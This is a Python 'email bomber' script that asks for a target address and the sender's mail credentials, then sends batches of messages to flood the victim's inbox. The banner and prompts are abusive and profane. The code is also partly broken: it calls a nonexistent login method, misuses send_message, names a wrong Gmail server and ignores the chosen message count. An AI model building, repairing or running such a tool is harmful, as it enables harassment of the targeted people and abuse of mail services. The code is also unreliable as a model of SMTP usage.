# email spammer
# imports


import smtplib
import sys
import time

# start


class bcolors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'



def banner():
    a = "welcom to my first email spammer its feel good to f**k some one whit spam try it...."
    b = "made by <kasra akhavan> <IRANIAN HACKER>"
    c = "big tnx to you for using my tool..."
    d = ''' 
    you can tell me if you like this tool by like it in git hub ......
                        ..  ..             ;;;;;;;;;;
                       .  ..  .          ;;;         ;;;
                      .        .        ;;;  ;;; ;;; ;;;
                       .      .        ;;;;    ;;;   ;;;;  ------> this is you :)
                        .    .        ;;;;;   ;   ;  ;;;;;
                          . .        ;;;;;   ;;   ;;  ;;;;; 
                           .        ;;;;;              ;;;;;;                            
                                  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                                           LOVE YOU MEN
                        


                           '''
    print(bcolors.RED + a)
    time.sleep(2)
    print(bcolors.GREEN + b)
    print(bcolors.DARKCYAN + c)
    print(bcolors.BLUE + d)
class Email_Bomber:
    count = 0
    def __init__(self):
        try:
            print(bcolors.GREEN + "\n starting program...")
            self.target = str(input(bcolors.RED + "please enter target email \nexample:(kasra@kasra.com)\n<box>: "))
            self.mode =int(input(bcolors.RED + 'enter Bomb count (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom)\n<box>: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("that number is suck <FUCK YOU>")
                time.sleep(2)
                print("oh sorry men i was wronge but at less your math is suck...\nbye bye")
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
    def bomb(self):
        try:
            print(bcolors.BLUE + 'set up bomb to fuck they mother')
            self.amount = None 
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.BLUE + 'choose a custom amount\n<box>: '))
            print( bcolors.GREEN + f"\n you select bomb at mode {self.mode} and {self.amount} amount ")
        except Exception as e:
            print(f"ERROR: {e}")

    def email(self):
        try:
            print(bcolors.RED + "setup the email to fuck them...........")
            self.server = str(input(bcolors.GREEN + 'Enter email server || or choose one of the options 1)Gmail 2)Yahoo 3)Outlook \n <box>:'))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in  premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + "enter your port number\n<box>: "))
            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.google.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp.mail.outlook.com'
            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address\n<box>:'))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password\n<box>:'))
            self.subject = str(input(bcolors.GREEN + 'Enter from subject of email\n<box>:'))
            self.message = str(input(bcolors.GREEN + 'Enter message\n<box>:'))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f"ERROR: {e}")
    def send(self):
        try:
            self.s.send_message(self.fromAddr, self.target, self.msg)
            self.count +=1 
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f"ERROR: {e}")
    def attack(self):
        for email in range(20):
            print(bcolors.GREEN + '\n Attempting secure account login')
            self.s.login(self.fromAddr, self.fromPwd)
            print(bcolors.RED + '\n ATTACK IS START B!TCH')
        for email in range(50):
            self.send()
            time.sleep(0.5)
        time.sleep(60)
        self.s.close()
        print(bcolors.RED + '---Attack finished---')

if __name__ =='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
